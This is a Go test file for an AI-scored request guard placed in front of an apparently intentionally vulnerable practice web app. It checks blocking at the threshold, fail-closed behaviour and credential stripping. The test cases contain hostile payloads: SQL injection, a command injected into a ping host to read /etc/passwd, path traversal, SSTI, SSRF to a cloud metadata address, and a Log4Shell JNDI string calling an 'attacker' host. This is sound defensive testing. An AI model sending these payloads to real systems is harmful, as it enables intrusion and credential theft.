package http_test

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/m-mizutani/goerr/v2"
	"github.com/m-mizutani/gt"
	"github.com/m-mizutani/semgate/providers"

	httpctrl "github.com/m-mizutani/semgate-example/pkg/controller/http"
)

// fakeProvider answers every question of one evaluation without calling the
// TypeSafe API. It answers by question type rather than by key, because the
// keys are assigned by semgate in the order NewGuard passes the questions.
type fakeProvider struct {
	probability float64 // answer to the Noul question
	choice      string  // answer to the Choice question; must be one of its options
	confidence  float64
	err         error // when set, the evaluation fails

	mu    sync.Mutex
	calls int
	state providers.State
}

func (f *fakeProvider) Evaluate(_ context.Context, req *providers.Request) (*providers.Response, error) {
	f.mu.Lock()
	f.calls++
	f.state = req.State
	f.mu.Unlock()

	if f.err != nil {
		return nil, f.err
	}

	answers := make(map[string]json.RawMessage, len(req.Questions))
	for key, spec := range req.Questions {
		switch spec.Type {
		case providers.QuestionTypeNoul:
			answers[key] = json.RawMessage(fmt.Sprintf(`{"type":"noul","noul":%v}`, f.probability))
		case providers.QuestionTypeChoice:
			answers[key] = json.RawMessage(fmt.Sprintf(
				`{"type":"choice","choice":%q,"probabilities":{%q:%v},"confidence":%v}`,
				f.choice, f.choice, f.confidence, f.confidence))
		default:
			return nil, goerr.New("unexpected question type", goerr.V("type", spec.Type))
		}
	}
	return &providers.Response{Answers: answers}, nil
}

func (f *fakeProvider) observed() (int, providers.State) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.calls, f.state
}

type blockBody struct {
	Blocked     bool    `json:"blocked"`
	Category    string  `json:"category"`
	Probability float64 `json:"probability"`
	Confidence  float64 `json:"confidence"`
	Message     string  `json:"message"`
	Error       string  `json:"error"`
}

// newGuardedServer starts the range with the semgate guard in front of /api,
// backed by fake.
func newGuardedServer(t *testing.T, fake *fakeProvider, threshold float64, logBuf io.Writer) *httptest.Server {
	t.Helper()
	guard, err := httpctrl.NewGuard(fake, threshold)
	gt.NoError(t, err)
	srv := httptest.NewServer(newTestServer(t, logBuf, httpctrl.WithGuard(guard)))
	t.Cleanup(srv.Close)
	return srv
}

func decodeBlock(t *testing.T, res *http.Response) blockBody {
	t.Helper()
	var body blockBody
	gt.NoError(t, json.NewDecoder(res.Body).Decode(&body))
	return body
}

func TestGuardBlocksLikelyAttacks(t *testing.T) {
	cases := []attackCase{
		{name: "sqli", method: http.MethodPost, path: "/api/login",
			body: `{"username":"admin' OR '1'='1","password":"x"}`, category: "sqli"},
		{name: "command_injection", method: http.MethodGet,
			path: "/api/ping?host=" + urlEnc("example.com; cat /etc/passwd"), category: "command_injection"},
		{name: "path_traversal", method: http.MethodGet,
			path: "/api/files?path=" + urlEnc("../../../etc/passwd"), category: "path_traversal"},
		{name: "ssti", method: http.MethodGet,
			path: "/api/greet?name=" + urlEnc("{{7*7}}"), category: "ssti"},
		{name: "ssrf", method: http.MethodGet,
			path: "/api/fetch?url=" + urlEnc("http://169.254.169.254/latest/meta-data/"), category: "ssrf"},
		{name: "log4shell", method: http.MethodGet, path: "/api/track",
			header: [2]string{"X-Log-Tag", "${jndi:ldap://attacker/x}"}, category: "log4shell"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			fake := &fakeProvider{probability: 0.97, choice: tc.category, confidence: 0.9}
			srv := newGuardedServer(t, fake, 0.8, nil)

			res := doGuardRequest(t, srv.URL, tc)
			defer func() { _ = res.Body.Close() }()

			gt.Number(t, res.StatusCode).Equal(http.StatusForbidden)
			body := decodeBlock(t, res)
			gt.Bool(t, body.Blocked).True()
			gt.String(t, body.Category).Equal(tc.category)
			gt.Number(t, body.Probability).Equal(0.97)
			gt.String(t, body.Message).IsNotEmpty()
		})
	}
}

// TestGuardAllowsBenignRequests is the paired positive: below the threshold the
// request reaches the handler, which answers with the usual envelope.
func TestGuardAllowsBenignRequests(t *testing.T) {
	fake := &fakeProvider{probability: 0.02, choice: httpctrl.CategoryBenign, confidence: 0.95}
	srv := newGuardedServer(t, fake, 0.8, nil)

	res, err := http.Get(srv.URL + "/api/greet?name=Alice")
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	env := decodeEnvelope(t, res.Body)
	gt.Bool(t, env.Exploited).False()
}

// TestGuardAllowsAttackBelowThreshold shows that the guard blocks on the
// probability alone: a payload that would fire still reaches the handler when
// the model is not confident enough.
func TestGuardAllowsAttackBelowThreshold(t *testing.T) {
	fake := &fakeProvider{probability: 0.4, choice: "sqli", confidence: 0.4}
	srv := newGuardedServer(t, fake, 0.8, nil)

	body := `{"username":"admin' OR '1'='1","password":"x"}`
	res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	env := decodeEnvelope(t, res.Body)
	gt.Bool(t, env.Exploited).True()
}

// TestGuardBlocksAtThreshold pins the boundary: the threshold itself blocks.
func TestGuardBlocksAtThreshold(t *testing.T) {
	fake := &fakeProvider{probability: 0.8, choice: "ssti", confidence: 0.7}
	srv := newGuardedServer(t, fake, 0.8, nil)

	res, err := http.Get(srv.URL + "/api/greet?name=" + urlEnc("{{7*7}}"))
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusForbidden)
}

// TestGuardFailsClosedOnEvaluationError confirms that a request whose
// evaluation failed is answered by the guard and never reaches the handler.
func TestGuardFailsClosedOnEvaluationError(t *testing.T) {
	var logBuf bytes.Buffer
	fake := &fakeProvider{err: goerr.New("provider is unreachable")}
	srv := newGuardedServer(t, fake, 0.8, &logBuf)

	res, err := http.Get(srv.URL + "/api/greet?name=Alice")
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusServiceUnavailable)
	body := decodeBlock(t, res)
	gt.Bool(t, body.Blocked).False()
	gt.String(t, body.Error).IsNotEmpty()
	gt.String(t, logBuf.String()).Contains(`"msg":"guard_evaluation_failed"`)
	// The handler never ran, so no detection record was emitted.
	gt.String(t, logBuf.String()).NotContains(`"msg":"detection"`)
}

// TestGuardSendsPayloadWithoutCredentials checks what leaves the process: the
// attack-carrying fields are evaluated, the credential headers are not sent.
func TestGuardSendsPayloadWithoutCredentials(t *testing.T) {
	fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
	srv := newGuardedServer(t, fake, 0.8, nil)

	req, err := http.NewRequest(http.MethodGet, srv.URL+"/api/track", nil)
	gt.NoError(t, err)
	req.Header.Set("X-Log-Tag", "${jndi:ldap://attacker/x}")
	req.Header.Set("Authorization", "Bearer secret-token")
	req.Header.Set("Proxy-Authorization", "Basic secret-proxy")
	req.Header.Set("Cookie", "session=secret-session")
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)

	calls, state := fake.observed()
	gt.Number(t, calls).Equal(1)
	gt.Map(t, state.Headers).HasKey("X-Log-Tag")
	gt.Map(t, state.Headers).NotHasKey("Authorization")
	gt.Map(t, state.Headers).NotHasKey("Proxy-Authorization")
	gt.Map(t, state.Headers).NotHasKey("Cookie")
	gt.String(t, state.Path).Equal("/api/track")
}

// TestGuardEvaluatesRequestBody confirms the login payload is evaluated and
// still reaches the handler intact when it is allowed through.
func TestGuardEvaluatesRequestBody(t *testing.T) {
	fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
	srv := newGuardedServer(t, fake, 0.8, nil)

	body := `{"username":"alice","password":"wrong"}`
	res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)

	_, state := fake.observed()
	gt.String(t, state.Body).Equal(body)
	gt.String(t, state.BodyStatus).Equal("complete")

	env := decodeEnvelope(t, res.Body)
	gt.Bool(t, env.Exploited).False()
}

// TestGuardSkipsStaticFiles confirms the guard is installed on /api only, so
// serving the SPA costs no evaluation.
func TestGuardSkipsStaticFiles(t *testing.T) {
	fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
	srv := newGuardedServer(t, fake, 0.8, nil)

	res, err := http.Get(srv.URL + "/hints")
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()

	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	calls, _ := fake.observed()
	gt.Number(t, calls).Equal(0)
}

// TestGuardRefusesOversizeBodyWithoutEvaluating pins the reason boundBody runs
// after the guard: a body the range refuses must be answered 413 and must never
// be sent to the provider, whether or not its length is known in advance.
func TestGuardRefusesOversizeBodyWithoutEvaluating(t *testing.T) {
	big := `{"username":"` + strings.Repeat("a", 1100) + `","password":"x"}`

	t.Run("content length known", func(t *testing.T) {
		fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
		srv := newGuardedServer(t, fake, 0.8, nil)

		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(big))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()

		gt.Number(t, res.StatusCode).Equal(http.StatusRequestEntityTooLarge)
		calls, _ := fake.observed()
		gt.Number(t, calls).Equal(0)
	})

	t.Run("chunked body", func(t *testing.T) {
		fake := &fakeProvider{probability: 0.99, choice: "sqli", confidence: 0.99}
		srv := newGuardedServer(t, fake, 0.8, nil)

		// A reader of an unknown type makes net/http send the body chunked, so
		// the server sees ContentLength == -1 and the length is only discovered
		// while reading.
		req, err := http.NewRequest(http.MethodPost, srv.URL+"/api/login",
			io.NopCloser(strings.NewReader(big)))
		gt.NoError(t, err)
		req.Header.Set("Content-Type", "application/json")
		res, err := http.DefaultClient.Do(req)
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()

		gt.Number(t, res.StatusCode).Equal(http.StatusRequestEntityTooLarge)
		calls, _ := fake.observed()
		gt.Number(t, calls).Equal(0)
	})

	t.Run("a body at the bound is still evaluated", func(t *testing.T) {
		fake := &fakeProvider{probability: 0.1, choice: httpctrl.CategoryBenign, confidence: 0.9}
		srv := newGuardedServer(t, fake, 0.8, nil)

		// Exactly maxInputBytes, so it is inside the bound.
		padding := 1024 - len(`{"username":"","password":"x"}`)
		body := `{"username":"` + strings.Repeat("a", padding) + `","password":"x"}`
		gt.Number(t, len(body)).Equal(1024)

		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()

		gt.Number(t, res.StatusCode).Equal(http.StatusOK)
		calls, state := fake.observed()
		gt.Number(t, calls).Equal(1)
		gt.String(t, state.BodyStatus).Equal("complete")
	})
}

func TestNewGuardRejectsInvalidThreshold(t *testing.T) {
	for _, threshold := range []float64{0, -0.1, 1.01, math.NaN()} {
		t.Run(fmt.Sprintf("%v", threshold), func(t *testing.T) {
			_, err := httpctrl.NewGuard(&fakeProvider{}, threshold)
			gt.Error(t, err)
		})
	}
}

func doGuardRequest(t *testing.T, baseURL string, tc attackCase) *http.Response {
	t.Helper()
	req, err := http.NewRequest(tc.method, baseURL+tc.path, strings.NewReader(tc.body))
	gt.NoError(t, err)
	if tc.body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	if tc.header[0] != "" {
		req.Header.Set(tc.header[0], tc.header[1])
	}
	res, err := http.DefaultClient.Do(req)
	gt.NoError(t, err)
	return res
}
